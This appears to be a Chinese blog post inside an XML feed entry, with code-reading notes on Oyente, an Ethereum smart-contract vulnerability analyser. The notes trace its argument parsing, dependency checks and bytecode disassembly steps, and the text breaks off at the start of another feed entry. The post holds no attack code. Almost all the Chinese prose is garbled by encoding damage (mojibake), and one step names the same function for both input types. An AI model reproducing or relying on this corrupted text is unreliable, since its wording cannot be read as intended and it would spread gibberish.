ä¸ªå…³é”®äº›çš„æ–‡ä»¶ï¼ˆå¤¹ï¼‰ï¼š</p><p><code>README.md</code> ï¼šæˆ‘ä»¬åœ¨ Github ä¸‹è½½çš„æ—¶å€™å·²ç»çœ‹äº†ï¼Œè®²è§£docker æˆ–è€…ä¾èµ–å®‰è£…ç­‰ <code>code.md</code>ï¼šä¸­è®²è¿°äº†æœ¬é¡¹ç›®çš„å¤§è‡´ä»£ç ç»“æ„ï¼Œå¯ä»¥å…ˆçœ‹ä¸€éï¼Œç„¶åçœ‹ä»£ç çš„æ—¶å€™å¯¹ç…§ç€çœ‹ã€‚<code>setup.py</code> : setuptools çš„æ„å»ºè„šæœ¬ï¼Œç”¨æ¥å‘Šè¯‰ setuptoolså…³äºæœ¬é¡¹ç›®ï¼ˆåŒ…ï¼‰çš„æè¿°ã€å…¥å£ç‚¹ã€æ•°æ®ã€åŒ…å«çš„æ¨¡å—ç­‰ï¼Œå¯ä»¥çœ‹ä¸€éäº†è§£é¡¹ç›®æ¦‚å†µã€‚å…³äº<code>setup.py</code> çš„è¯¦ç»†ä¿¡æ¯ï¼Œè§ Packaging Python Projects <ahref="#fn1" class="footnote-ref" id="fnref1"role="doc-noteref"><sup>1</sup></a> <code>misc_utils æ–‡ä»¶å¤¹</code> :æ‚é¡¹ï¼Œæ”¾äº†ä¸€äº›å¯¹æœ¬é¡¹ç›®å®ç”¨çš„å·¥å…·è„šæœ¬ <code>oyente æ–‡ä»¶å¤¹</code> ï¼šé¡¹ç›®çš„ä¸»è¦æºç æ–‡ä»¶å¤¹</p><p><code>sol_examples æ–‡ä»¶å¤¹</code> : æ˜¯æˆ‘åœ¨ <ahref="https://github.com/ConsenSys/mythril/tree/develop/solidity_examples">Mythrilçš„ github ä»“åº“</a> ä¸‹è½½çš„ï¼Œä¾¿äºæµ‹è¯•ä½¿ç”¨ï¼ˆå¦‚æœå¯ä»¥çš„è¯ï¼‰ã€‚</p><h3 id="level-two">Level Two</h3><h4 id="oyente.oyentemain">oyente.oyente:main</h4><p>å…¥å£ç‚¹ï¼š oyente æ–‡ä»¶å¤¹ä¸­ <code>oyente.py</code> çš„ main() å‡½æ•°</p><ol start="0" type="1"><li><p>å£°æ˜ args å…¨å±€å˜é‡</p><p>åé¢åœ¨ analyze_bytecode ç­‰å‡½æ•°ä¸­ä¼šç”¨åˆ°è¾“å…¥å‚æ•°ä»¬ argsã€‚</p><p>è¿™é‡Œç¼–ç ä¸è§„èŒƒï¼Œåº”è¯¥åœ¨æ‰€æœ‰å‡½æ•°å¤–å£°æ˜å…¨å±€å˜é‡ï¼Œè™½ç„¶å¯ä»¥åœ¨å‡½æ•°å†…åˆ›å»ºå…¨å±€å˜é‡ï¼Œä½†æ˜¯ä¸æ¨èï¼Œ<ahref="#fn2" class="footnote-ref" id="fnref2"role="doc-noteref"><sup>2</sup></a></p></li><li><p>é€šè¿‡ argparse æ¨¡å—è®¾ç½®å‚æ•°</p><ul><li>åªéœ€è¦ True æˆ–è€… False çš„é€‰é¡¹ï¼Œä½¿ç”¨äº† argparse çš„ action å‚æ•°<ahref="#fn3" class="footnote-ref" id="fnref3"role="doc-noteref"><sup>3</sup></a></li></ul><p>æ¯”å¦‚ï¼šargs.sourceã€args.evmã€args.standard_jsonç­‰è¾“å…¥è¾“å‡ºç±»å‹ã€è¿‡ç¨‹é…ç½®ç›¸å…³å‚æ•°</p><ul><li><p>dest å‚æ•°æ˜ç¡®æŒ‡å®šå‚æ•°å±æ€§å<a href="#fn4" class="footnote-ref"id="fnref4" role="doc-noteref"><sup>4</sup></a></p></li><li><p>nargs å¯¹ä¸€ä¸ª action ç»‘å®šå¤šä¸ªå‚æ•°ï¼Œå…¶å€¼ä¸º â€œ+â€ æ—¶ï¼ŒæŠŠè¯¥ actionæ‰€æœ‰å‚æ•° gathered into a list <a href="#fn5" class="footnote-ref"id="fnref5" role="doc-noteref"><sup>5</sup></a></p></li></ul><ol type="1"><li><p>è¾“å…¥</p><p>æ¥å—ä¸‰ç§è¾“å…¥ï¼šsolidity programã€evm bytecodeã€remote contractsè¿™é‡Œï¼Œå®ƒä½¿ç”¨ <code>add_mutually_exclusive_group(require=True)</code>äº’æ–¥å‚æ•°ç»„æ¥ç¡®ä¿å°†äº’æ–¥ç»„ä¸­åªæœ‰ä¸€ä¸ªå‚æ•°åœ¨å‘½ä»¤è¡Œä¸­å¯ç”¨ï¼Œä¸”è‡³å°‘æœ‰ä¸€ä¸ªã€‚å…·ä½“è¾“å…¥ç±»å‹: | ç±»å‹| æœ¬åœ° | è¿œç¨‹ URL| |-------|----|-------| | solidity| -s filename | -ru url_address| | å­—èŠ‚ç  | -b -s filename | -b -ruurl_address|</p><p>solidity æºç ï¼Œè¿˜å¯ä»¥æŒ‡å®šè¾“å…¥ä¸ºæ ‡å‡† json æ ¼å¼ã€‚</p></li><li><p>ç¨‹åºè¿è¡Œé…ç½®ç›¸å…³</p><p>å¦‚ï¼šæŒ‡å®šè¿è¡Œ <strong>solidity æºç </strong>ä¸­çš„æŸï¼ˆå‡ ï¼‰ä¸ªåˆçº¦target-contractã€å¹¶è¡Œ parallelã€debug ç­‰</p></li><li><p>è¿è¡Œè¿‡ç¨‹ä¸­ç›¸å…³ IO å¤„ç†ã€æ“ä½œç›¸å…³</p><p>å¦‚ï¼Œè¾“å‡ºæŠ¥é”™ï¼Œåˆ›å»ºæŠ¥å‘Šç­‰</p></li><li><p>æ£€æµ‹è¿è¡Œç›¸å…³</p><p>å¦‚ï¼šGasã€loopã€depth çš„é™åˆ¶ã€è·¯å¾„ç­‰</p></li></ol></li><li><p>æ ¹æ®è¾“å…¥çš„å‚æ•°å’Œé¢„å…ˆè®¾ç½® 0. å¦‚æœä¸ºæœ¬åœ°æ–‡ä»¶ï¼ˆ.sol æˆ– .evmï¼‰ï¼Œé€šè¿‡-s é€‰é¡¹ï¼Œè·å–åˆ° args.source çš„å€¼</p><ol type="1"><li>è¿›è¡Œå…¨å±€å‚æ•°ã€æ—¥å¿—é…ç½®</li><li>ç¡®ä¿æŒ‡å®šæ£€æµ‹æŸä¸ªåˆçº¦çš„åŠŸèƒ½ï¼Œåªèƒ½åœ¨æºç è¾“å…¥æƒ…å†µä¸‹è¿›è¡Œã€‚</li><li><code>has_dependencies_installed</code> åˆ¤æ–­ä¾èµ–ï¼ˆ<code>z3ã€evmã€solc</code> ï¼‰æ˜¯å¦å®‰è£…ï¼Œå¹¶é€šè¿‡<code>compare_versions</code>å‡½æ•°æ¯”è¾ƒç‰ˆæœ¬æ˜¯å¦ä¸ºæµ‹è¯•ç‰ˆæœ¬(åŠä»¥ä¸‹)ï¼Œå¦‚ä¸æ»¡è¶³ï¼Œåˆ™æç¤ºã€å¹¶é€€å‡ºç¨‹åºã€‚</li><li>å¦‚æœæ˜¯è¿œç¨‹ URLï¼Œåˆ™åˆ›å»º remote_contract.sol æˆ–remote_contract.evmï¼Œå¹¶ä½¿ç”¨ requests æ¨¡å—å†™å…¥,ç„¶åè®¾ç½® args.sourceä¸ºæ–‡ä»¶å</li><li>æ£€æµ‹å­—èŠ‚ç  <code>analyze_solidity</code> æˆ–è€…æºç <code>analyze_solidity</code></li><li>æ£€æµ‹å®Œæ¯•ï¼Œé€€å‡º <code>exit_code</code></li></ol></li></ol><h4id="oyente.oyentehas_dependencies_installed">oyente.oyente:has_dependencies_installed</h4><p>æœ¬å‡½æ•°åˆ¤æ–­ä¾èµ–æ˜¯å¦å®‰è£…ã€ä¸”ç‰ˆæœ¬æ˜¯å¦ä¸ºæµ‹è¯•ç‰ˆæœ¬(åŠä»¥ä¸‹), ç‰ˆæœ¬è¦æ±‚ï¼š<code>z3 &lt;= 4.5.1</code> ã€ <code>evm &lt;= 1.7.3</code> ã€<code>solc &lt;= 0.4.19</code> ï¼Œå¦åˆ™é€€å‡ºç¨‹åº</p><p>å‡ ä¸ªæ³¨æ„çš„ç‚¹ï¼š</p><ol type="1"><li><p>Python è¿è¡Œç»ˆç«¯å‘½ä»¤ï¼Œ <code>type cmd</code> åˆ¤æ–­å‘½ä»¤æ˜¯å¦å­˜åœ¨</p><ol type="1"><li>cmd_exist å¼€å¯ä¸€ä¸ªå­è¿›ç¨‹åœ¨ shell ä¸­æ‰§è¡Œ <code>type cmd</code>å‘½ä»¤æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨</li></ol><p>ä¸ºä»€ä¹ˆè¦ä½¿ç”¨å­è¿›ç¨‹æµ‹è¯•å‘¢ï¼Ÿ å±äº â€Python ä¸­è°ƒç”¨ Linuxå‘½ä»¤å¹¶è·å–è¿”å›å€¼â€œ çŸ¥è¯†èŒƒç•´<a href="#fn6" class="footnote-ref"id="fnref6" role="doc-noteref"><sup>6</sup></a> ç»“è®ºï¼šå¦‚æœè¦å…¼å®¹ python3.5 ä»¥ä¸‹å°±ç”¨ subprocess.callï¼Œåä¹‹ï¼Œç”¨ subprocess.run<a href="#fn7"class="footnote-ref" id="fnref7"role="doc-noteref"><sup>7</sup></a></p></li><li><p>è·å¾—ç‰ˆæœ¬</p></li><li><p>æ¯”è¾ƒç‰ˆæœ¬ <a href="#fn8" class="footnote-ref" id="fnref8"role="doc-noteref"><sup>8</sup></a></p><p>é€šè¿‡ <code>compare_versions</code> å‡½æ•°ï¼Œä½¿ç”¨ pypthon2 çš„ cmpæ¯”è¾ƒï¼Œä½†æ˜¯è¿˜é€šè¿‡ six æ¨¡å—åˆ¤æ–­ï¼Œåœ¨æ¯”è¾ƒæ—¶ï¼Œå¯¹ python3 åšäº†å…¼å®¹ï¼Œ</p><ul class="task-list"><li><label><inputtype="checkbox" />è¿™é‡Œçš„æ¯”è¾ƒå‡½æ•°éœ€è¦åŒºåˆ†å°äºç­‰äºå’Œå¤§äºï¼Œå¯ä»¥ç›´æ¥æ”¹ç”¨<code>&lt;=</code> ,ç„¶åæŠŠè°ƒç”¨è¯¥å‡½æ•°é‚£å„¿çš„åˆ¤æ–­æ”¹ä¸€ä¸‹ã€‚</label></li></ul><p>python ä¸­ç›´æ¥ä½¿ç”¨ <code>&lt;ã€&gt;ã€==ã€&gt;=</code>ç­‰è¿›è¡Œæ¯”è¾ƒå³å¯</p><p>ä¸ºä»€ä¹ˆè¦æ¯”è¾ƒå°äºç­‰äºï¼Ÿ ç‰ˆæœ¬çš„å‘åå…¼å®¹æ€§(Backward Compatibility)<ahref="#fn9" class="footnote-ref" id="fnref9"role="doc-noteref"><sup>9</sup></a></p><p>ä¸è¿‡ï¼Œæœ‰çš„ urllib2 ç­‰åˆæ²¡æœ‰å¯¹ python2 åšå…¼å®¹ï¼ŒçœŸæ˜¯å¥‡æ€ªã€‚æˆ‘ä»¬ç›´æ¥ä¸Špython3ï¼Œä¸ç”¨å…¼å®¹ python2ï¼Œå®ƒéƒ½è¦è¢«æ·˜æ±°äº†ã€‚</p></li><li><p>åˆ¤æ–­ z3 ä¾èµ–çš„æ–¹æ³•</p><p>å®ƒé‡‡ç”¨æ•è· import å¼‚å¸¸çš„æ–¹æ³•ä»¥åŠè·å–ç‰ˆæœ¬å‡½æ•°çš„æ–¹å¼</p><p>åœ¨æˆ‘çš„ linux ä¸Šï¼Œz3 ä¹Ÿå¯ä»¥é€šè¿‡ <code>type z3</code>åˆ¤æ–­å­˜åœ¨ä¸å¦ï¼Œé€šè¿‡ <code>z3 --version</code>æ¥è·å–ç‰ˆæœ¬ï¼Œå³ï¼šå’Œå…¶ä»–ä¸¤ä¸ªä¾èµ–æ–¹æ³•ä¸€ç›´ã€‚ ä½†æ˜¯æˆ‘çš„ Ubuntu serverä¸Šè²Œä¼¼ä¸è¡Œï¼Œåé¢çœ‹çœ‹ä½ ä»¬å¯ä¸å¯ä»¥ï¼Œå¦‚æœå¯ä»¥ï¼Œé‚£è¿™é‡Œç”¨å‡½æ•°æŠŠä¸‰è€…ç»Ÿä¸€ä¸€ä¸‹ã€‚</p><ul class="task-list"><li><label><inputtype="checkbox" />è¿™é‡Œå¯ä»¥ä¼˜åŒ–ä¸€ä¸‹ï¼ŒæŠŠä¸‰ä¸ªä¾èµ–æ˜¯å¦å­˜åœ¨çš„åˆ¤æ–­æ–¹æ³•å†™æˆä¸€ä¸ªå‡½æ•°ã€‚</label></li></ul></li></ol><p>åˆ¤æ–­å‘½ä»¤æ˜¯å¦å­˜åœ¨ï¼Œä¸€èˆ¬æœ‰ typeã€hashã€python æ•è·å¯¼å…¥å¼‚å¸¸<ahref="#fn10" class="footnote-ref" id="fnref10"role="doc-noteref"><sup>10</sup></a> <a href="#fn11"class="footnote-ref" id="fnref11"role="doc-noteref"><sup>11</sup></a></p><h4id="oyente.oyenteanalyze_bytecode">oyente.oyente:analyze_bytecode</h4><ol type="1"><li><p>åˆ›å»º Input_Helper ç±»çš„å¯¹è±¡</p><p>ç±»å¯¹è±¡çš„åˆå§‹åŒ–æ“ä½œä¸»è¦å·¥ä½œ ç¡®å®šè¦æ£€æµ‹çš„æ–‡ä»¶ç±»å‹ä¸ä½ç½®è®¾ç½®é»˜è®¤å‚æ•°ï¼Œå¹¶è·å–ä¸€äº›é…ç½®å‚æ•°</p><ol type="1"><li><p>å¹¶æ ¹æ®è¾“å…¥ç±»å‹ï¼šå­—èŠ‚ç è®¾ç½®ä¸€äº›é»˜è®¤å±æ€§</p><p>ä¼ å…¥ InputHelper.BYTECODEå…±æœ‰ç±»å±æ€§[^class_attr]ï¼Œæ¥è¯´æ˜è¾“å…¥ä¸ºå­—èŠ‚ç </p></li><li><p>éå†å­—å…¸é¡¹ï¼šå±æ€§</p><p>ä½¿ç”¨ six.iteritems éå†å­—å…¸ï¼Œåšäº† python2/3 çš„å…¼å®¹<a href="#fn12"class="footnote-ref" id="fnref12"role="doc-noteref"><sup>12</sup></a>ï¼Œè¿™é‡Œå†è¯´ä¸€å¥ï¼Œæœ¬é¡¹ç›®æ²¡æœ‰å…¨éƒ¨å…¼å®¹å¤„ç†ï¼Œæœ‰é—®é¢˜ã€‚ã€‚é€šè¿‡å­—å…¸çš„ æŒ‡å®š default å‚æ•°çš„ get æ–¹æ³•è·å–å±æ€§<a href="#fn13"class="footnote-ref" id="fnref13" role="doc-noteref"><sup>13</sup></a>ä½¿ç”¨ setattr å®ç°åœ¨å¾ªç¯ä¸­ï¼Œè®¾ç½®ä»»æ„å±æ€§åå’Œä»»æ„å±æ€§å€¼<a href="#fn14"class="footnote-ref" id="fnref14"role="doc-noteref"><sup>14</sup></a></p></li></ol></li><li><p>è°ƒç”¨ helper å¯¹è±¡çš„ get_inputs()è·å–è¿”å›åˆ—è¡¨çš„ç¬¬ä¸€é¡¹ï¼Œå…¶å†…å®¹ä¸ºï¼šåæ±‡ç¼–ç»“æœçš„æ–‡ä»¶å</p><ol type="1"><li><p>å¯¹äºæŒ‡å®šæ£€æµ‹ solidity æºç æ–‡ä»¶ä¸­çš„æŸå‡ ä¸ªåˆçº¦çš„ï¼Œget_inputsé‡‡ç”¨äº†é»˜è®¤å‚æ•°</p><p>äº†è§£ä¸€ä¸‹ï¼Œå¯å˜å‚æ•°ï¼ˆè¿™é‡Œçš„è¯ï¼Œå°±æ˜¯ listï¼‰çš„é»˜è®¤å‚æ•°éœ€è¦è®¾ç½®ä¸º None <ahref="#fn15" class="footnote-ref" id="fnref15"role="doc-noteref"><sup>15</sup></a></p></li><li><p>å¯¹äºå­—èŠ‚ç ï¼Œå®ƒæ ¹æ® args.source ä¸­çš„æ–‡ä»¶åè¯»å–å†…å®¹åˆ° bytecodeå˜é‡</p></li><li><p>å°† bytecode ä¼ é€’ç»™è‡ªèº«çš„ç§æœ‰æ–¹æ³•<code>_prepare_disasm_file</code></p></li><li><p>_prepare_disasm_file å¤„ç†å­—èŠ‚ç ï¼Œå¹¶ç”Ÿæˆåæ±‡ç¼–æ–‡ä»¶</p><ol type="1"><li><p>é€šè¿‡ _write_evm_file è¿›è¡Œå» SwarmHash å¤„ç†<a href="#fn16"class="footnote-ref" id="fnref16"role="doc-noteref"><sup>16</sup></a>,ç„¶åå†™å…¥åˆ°<code>f"&#123;args.source&#125;.evm"</code> æ–‡ä»¶ä¸­</p><p>å»é™¤å®ƒçš„åŸå› ï¼šswarm hash in bytecode can be misinterpreted as INVALIDopcode</p><p>SwarmHash/Swarm æ˜¯ä¸€ä¸ªç‚¹å¯¹ç‚¹æ–‡ä»¶å…±äº«ç³»ç»Ÿï¼Œè®¾è®¡ç”¨æ¥æœ‰æ•ˆåœ°å­˜å‚¨å’Œæ£€ç´¢ethereum åº”ç”¨ç¨‹åºå’Œåˆçº¦ä¸­æ‰€éœ€çš„æ•°æ®ã€‚ æœ€ç®€å•çš„ç±»æ¯”åº”è¯¥æ˜¯ï¼šSwarm æœ¬è´¨ä¸Šæ˜¯ether çš„ BitTorrentã€‚ solc ç¼–è¯‘åçš„å­—èŠ‚ç é‡Œé¢æœ‰ä¸ª CBORå…ƒæ•°æ®ç¼–ç ï¼Œå®ƒé‡Œé¢å°±æœ‰ SwarmHashã€‚SwarmHashä»¥å›ºå®šçš„ä¸²å¼€å¤´ï¼Œä»¥å›ºå®šçš„ä¸²ç»“å°¾ã€‚</p><ul class="task-list"><li><label><input type="checkbox" />ä¸åŒç‰ˆæœ¬ï¼ˆä»¬ï¼Ÿï¼‰ä¹‹é—´çš„ SwarmHashçš„å¼€å¤´å’Œç»“å°¾çš„å›ºå®šéƒ¨åˆ†å¥½åƒæœ‰æ‰€å˜åŒ–ï¼Œéœ€è¦ä»”ç»†è°ƒç ”ä¸€ä¸‹ã€‚</label></li></ul></li><li><p>é€šè¿‡ _write_disasm_file è¯»å–ä¸Šä¸€æ­¥å¤„ç†å¥½çš„ <code>.evm</code>ï¼Œç„¶ååæ±‡ç¼–ï¼Œå¹¶å†™å…¥åˆ° <code>f"&#123;args.source&#125;.evm.disasm"</code>æ–‡ä»¶ä¸­</p><ol type="1"><li><p>è¯»å–ä¸Šä¸€æ­¥å¤„ç†å®Œçš„å­—èŠ‚ç åˆ° <code>evm_file</code> å˜é‡</p></li><li><p>å¼€å¯ä¸€ä¸ªå­è¿›ç¨‹ subprocessï¼Œé€šè¿‡æ‰§è¡Œç»ˆç«¯å‘½ä»¤ï¼š<code>evm disasm evm_file</code> ï¼Œè‹¥åæ±‡ç¼–å¤±è´¥åˆ™é€€å‡ºç¨‹åº</p><p>è¿™é‡Œä½¿ç”¨äº† popen<a href="#fn17" class="footnote-ref" id="fnref17"role="doc-noteref"><sup>17</sup></a> run å‡½æ•°çš„åº•å±‚ï¼Œå°±æ˜¯ Popenå‡½æ•°ã€‚run å‡½æ•°æ˜¯åŒæ­¥çš„ï¼Œè¦ç­‰å¾…å­è¿›ç¨‹å®è¡Œç»“æŸï¼Œæˆ–è€…è¶…æ—¶ã€‚Popenåˆ›å»ºå­è¿›ç¨‹åï¼Œé‡‡ç”¨å¼‚æ­¥çš„æ–¹å¼ï¼Œä¸ä¼šç­‰å¾…ã€‚Popen æ¯” run è¦æ›´åŠ çµæ´»ï¼Œå¦‚æœrun å‡½æ•°è¿˜ä¸èƒ½æ»¡è¶³ä½ çš„éœ€æ±‚ï¼Œå°±è€ƒè™‘ Popen</p><ul class="task-list"><li><label><input type="checkbox" />run å’Œ popen é€‰æ‹©ï¼Ÿ</label></li></ul></li><li><p>å°†åæ±‡ç¼–ç»“æœå†™å…¥<code>f"&#123;args.source&#125;.evm.disasm"</code></p></li></ol></li></ol></li><li><p>ç„¶åå°†åæ±‡ç¼–ç»“æœæ–‡ä»¶åä½œ<code>&#123;'disasm_file': disasm_file&#125;</code> å­—å…¸ï¼Œé™„åŠ åˆ° inputsåˆ—è¡¨ä¸­å¹¶è¿”å›</p><ul class="task-list"><li><label><inputtype="checkbox" />ä¸çŸ¥é“è¿™é‡Œè¦ç”¨åˆ—è¡¨ï¼Œä¸å°±æ˜¯ä¸€ä¸ªå­—å…¸å…ƒç´ </label></li></ul></li></ol></li><li><p>å°†åæ±‡ç¼–çš„æ–‡ä»¶åä¼ å…¥ symExec.run()å¼€å§‹ç¬¦å·æ‰§è¡Œï¼Œæ£€æµ‹æ¼æ´ï¼Œå¹¶è¿”å›ç»“æœå’Œé€€å‡ºç </p></li><li><p>åˆ é™¤ä¸´æ—¶æ–‡ä»¶</p><p>åŒ…æ‹¬ä¹‹å‰ç”Ÿæˆçš„â€œå¤„ç†è¿‡çš„å­—èŠ‚ç æ–‡ä»¶â€ï¼Œâ€œåæ±‡ç¼–ç»“æœæ–‡ä»¶â€ï¼Œè¿˜æœ‰æ—¥å¿—ç­‰ã€‚</p></li><li><p>å¦‚æœæ˜¯å…¨å±€å‚æ•° WEB è®¾ç½®äº†ï¼Œä½¿ç”¨ six.print_ è¾“å‡ºä¸€ä¸‹ jsonæ ¼å¼çš„ç»“æœã€‚</p></li><li><p>è¿”å›é€€å‡ºç </p></li></ol><h2 id="ç›®å‰å‘ç°çš„ç¼ºç‚¹">ç›®å‰å‘ç°çš„ç¼ºç‚¹</h2><ol type="1"><li><p>åœ¨å‡½æ•°å†…ä½¿ç”¨ global <strong>åˆ›å»º</strong>å…¨å±€å˜é‡è‹å®‰ç„¶å¯ä»¥è¿™æ ·ç”¨ï¼Œä½†æ˜¯è²Œä¼¼ä¸æ¨èï¼Ÿ</p></li><li><p>python2 ä¸ python3 å…¼å®¹æ€§æ²¡åšå¥½ è™½ç„¶ä½¿ç”¨äº† sixæ¨¡å—ï¼Œä½†æ˜¯åªç”¨å…¶å¤„ç†äº† printï¼Œæ²¡å¤„ç†å¥½æ¯”è¾ƒã€urllib2 ç­‰ï¼Œè¿˜æ˜¯ä¸èƒ½å…¼å®¹python2 å’Œ python3</p></li><li><p>æ¨¡å—åŒ–ä¸å½»åº•ï¼Œä¸åŒåŠŸèƒ½ä¹‹é—´æœ‰ç‚¹æ··ä¹±ã€‚æ„Ÿè§‰ç›¸äº’ä¹‹é—´äº¤å‰ï¼ŒåŠŸèƒ½æœ‰ç‚¹æ··ä¹±ï¼Œä¹Ÿå¯èƒ½æ˜¯æˆ‘çœ‹æºç çš„èƒ½åŠ›ä¸å¤Ÿï¼Ÿ</p></li><li><p>åŠ¨æ€ä¸ºå¯¹è±¡æ·»åŠ å±æ€§ ä¸å¤ªæ–¹ä¾¿çœ‹ï¼Œä¸çŸ¥é“è§„ä¸è§„èŒƒ?</p></li><li><p>è·å–åˆ¤æ–­ä¾èµ–é‚£é‡Œæ²¡å‡†å¯ä»¥ç»Ÿä¸€ç”¨å‡½æ•°ï¼Ÿ</p></li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><ol start="0" type="1"><li><ahref="https://unix.stackexchange.com/questions/22494/copy-file-to-xclip-and-paste-to-firefox">Copyfile to xclip and paste to Firefox</a></li></ol><p>[^class_attr]ï¼š<ahref="https://www.python-course.eu/python3_class_and_instance_attributes.php#:~:text=Class%20attributes%20are%20attributes%20which,%20right%20below%20the%20class%20header.">Classand Instance Attributes</a> <ahref="https://blog.csdn.net/qq_31780525/article/details/72639491">Pythonä¸­çš„ç±»å±æ€§ã€å®ä¾‹å±æ€§ä¸ç±»æ–¹æ³•ã€é™æ€æ–¹æ³•</a></p><aside id="footnotes" class="footnotes footnotes-end-of-document"role="doc-endnotes"><hr /><ol><li id="fn1"><p><ahref="https://packaging.python.org/tutorials/packaging-projects/">PackagingPython Projects</a><a href="#fnref1" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn2"><p><ahref="https://stackoverflow.com/questions/4693120/use-of-global-keyword-in-python">Useof â€œglobalâ€ keyword in Python</a> <ahref="https://www.geeksforgeeks.org/global-keyword-in-python/">Globalkeyword in Python</a><a href="#fnref2" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn3"><p><ahref="https://docs.python.org/3/library/argparse.html#action">py3_doc_argpasre_action</a><ahref="#fnref3" class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn4"><p><ahref="https://docs.python.org/3/library/argparse.html#dest">py3_doc_argpasre_dest</a><ahref="#fnref4" class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn5"><p><ahref="https://docs.python.org/3/library/argparse.html#nargs">py3_doc_argpasre_nargs</a><ahref="#fnref5" class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn6"><p><ahref="https://www.cnblogs.com/mianbaoshu/p/12024498.html">Python ä¸­è°ƒç”¨Linux å‘½ä»¤å¹¶è·å–è¿”å›å€¼</a> <ahref="https://docs.python.org/3/library/os.html#os.system">os.system(command)</a><ahref="https://docs.python.org/3/library/subprocess.html#subprocess.run">Usingthe subprocess Module</a> <ahref="https://docs.python.org/3/library/subprocess.html#module-subprocess">Olderhigh-level API</a> <ahref="https://blog.csdn.net/bcfdsagbfcisbg/article/details/78180650">å…³äºos.system å’Œ os.popen çš„å‘</a><a href="#fnref6" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn7"><p><a href="https://www.pynote.net/archives/490">subprocessæ¨¡å—æ•™ç¨‹</a><a href="#fnref7" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn8"><p><ahref="https://codegolf.stackexchange.com/questions/49778/how-can-i-use-cmpa-b-with-python3">Howcan I use cmp(a, b) with Python3?</a> <ahref="https://portingguide.readthedocs.io/en/latest/comparisons.html">Comparingand Sorting</a><a href="#fnref8" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn9"><p><ahref="https://zhuanlan.zhihu.com/p/28195702">å‘å‰å…¼å®¹ä¸å‘åå…¼å®¹</a><ahref="#fnref9" class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn10"><p><ahref="https://stackoverflow.com/questions/592620/how-can-i-check-if-a-program-exists-from-a-bash-script">Howcan I check if a program exists from a Bash script?</a> <ahref="https://www.jianshu.com/p/fbffa5cc49e1">Bashä¸­å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªå‘½ä»¤æ˜¯å¦å­˜åœ¨</a><a href="#fnref10" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn11"><p><ahref="https://blog.csdn.net/longerzone/article/details/12948925">Linuxä¸‹çš„ä¸¤ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ -- /dev/null å’Œ /dev/zero ç®€ä»‹åŠå¯¹æ¯”</a> <ahref="https://blog.csdn.net/sunboy_2050/article/details/9288353">LinuxShell 1&gt;/dev/null 2&gt;&amp;1 å«ä¹‰</a> <ahref="https://www.zhihu.com/question/53295083">shell ç¨‹åºä¸­ 2&gt;/dev/null ä»£è¡¨ä»€ä¹ˆæ„æ€ï¼Ÿ</a><a href="#fnref11" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn12"><p><ahref="https://six.readthedocs.io/#six.iteritems">six_iteritems</a><ahref="#fnref12" class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn13"><p><ahref="https://www.runoob.com/python/att-dictionary-get.html">Pythonå­—å…¸(Dictionary) get()æ–¹æ³•</a> <ahref="https://www.runoob.com/python/python-func-setattr.html">Pythonsetattr() å‡½æ•°</a> <ahref="https://blog.csdn.net/Ghost_leader/article/details/60145971?utm_source=blogxgwz4">pythonä¸­çš„ setattr çš„ä½¿ç”¨</a> <ahref="https://python3-cookbook.readthedocs.io/zh_CN/latest/c07/p05_define_functions_with_default_arguments.html">å®šä¹‰æœ‰é»˜è®¤å‚æ•°çš„å‡½æ•°</a><ahref="#fnref13" class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn14"><p><ahref="https://www.runoob.com/python/att-dictionary-get.html">Pythonå­—å…¸(Dictionary) get()æ–¹æ³•</a> <ahref="https://www.runoob.com/python/python-func-setattr.html">Pythonsetattr() å‡½æ•°</a> <ahref="https://blog.csdn.net/Ghost_leader/article/details/60145971?utm_source=blogxgwz4">pythonä¸­çš„ setattr çš„ä½¿ç”¨</a> <ahref="https://python3-cookbook.readthedocs.io/zh_CN/latest/c07/p05_define_functions_with_default_arguments.html">å®šä¹‰æœ‰é»˜è®¤å‚æ•°çš„å‡½æ•°</a><ahref="#fnref14" class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn15"><p><ahref="https://www.runoob.com/python/att-dictionary-get.html">Pythonå­—å…¸(Dictionary) get()æ–¹æ³•</a> <ahref="https://www.runoob.com/python/python-func-setattr.html">Pythonsetattr() å‡½æ•°</a> <ahref="https://blog.csdn.net/Ghost_leader/article/details/60145971?utm_source=blogxgwz4">pythonä¸­çš„ setattr çš„ä½¿ç”¨</a> <ahref="https://python3-cookbook.readthedocs.io/zh_CN/latest/c07/p05_define_functions_with_default_arguments.html">å®šä¹‰æœ‰é»˜è®¤å‚æ•°çš„å‡½æ•°</a><ahref="#fnref15" class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn16"><p><ahref="https://www.one-tab.com/page/XHxD-FQcRxiUoyGZGQ8Gjw">OneTabShared: 9 tabs</a><a href="#fnref16" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn17"><p><ahref="https://www.pynote.net/archives/490">subprocess æ¨¡å—æ•™ç¨‹</a><ahref="#fnref17" class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li></ol></aside>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åŒºå—é“¾å…¥é—¨ä»‹ç»:ä»å†å²åˆ°åŸç†</title>
      <link href="/blog/2021/03/30/blockchain/0.intro/"/>
      <url>/blog/2021/03/30/blockchain/0.intro/</url>
      
